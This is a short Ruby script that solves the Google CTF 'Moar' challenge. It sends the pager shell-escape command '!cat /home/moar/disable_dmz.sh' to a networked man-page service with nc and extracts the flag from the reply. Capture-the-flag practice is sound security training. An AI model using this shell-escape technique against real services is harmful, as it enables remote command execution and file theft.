# Finding yourself on the Foobanizer9000, a computer built by 9000 foos, this computer
# is so complicated luckily it serves manual pages through a network service. As the old
# saying goes, everything you need is in the manual.

module GoogleCTFSolution
  class Moar
    def call
      p "⚑ FLAG ⚑: #{capture_the_flag}"
    end

    def self.call
      new.call
    end

    private

    # not using here but its good to know the url id
    def google_ctf_id
      "7a50da3856dc766fc167a3a9395e86bdcecabefc1f67c53f0b5d4a660f17cd50"
    end

    ##

    def capture_the_flag
      `
        echo '!cat /home/moar/disable_dmz.sh' |
              nc moar.ctfcompetition.com 1337 |
              grep CTF |
              cut -d " " -f 2 |
              sed -n 2p |
              tr -d '\n'
      `
    end
  end
end

GoogleCTFSolution::Moar.call
